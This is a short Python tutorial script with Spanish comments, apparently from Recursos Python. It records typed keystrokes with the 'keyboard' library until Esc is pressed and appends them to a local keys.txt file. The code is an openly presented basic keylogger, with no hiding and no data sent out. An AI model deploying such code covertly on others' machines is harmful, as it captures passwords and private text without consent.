#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#   Copyright 2013-2017 Recursos Python
#   www.recursospython.com
#   
#   Textlogger.- registrador de textos
#
import os
import keyboard

# Ubicación y nombre del archivo que guarda las teclas presionadas.
FILE_NAME = "keys.txt"

# Determina si el archivo de salida es limpiado cada vez que se
# inicia el programa.
CLEAR_ON_STARTUP = False

# Tecla para terminar el programa o None para no utilizar ninguna tecla.
TERMINATE_KEY = "esc"

def main():
    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
       
    output = open(FILE_NAME, "a")
       
    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_KEY)):
        output.write(string + "\n")
        
    output.close()

if __name__ == "__main__":
    main()
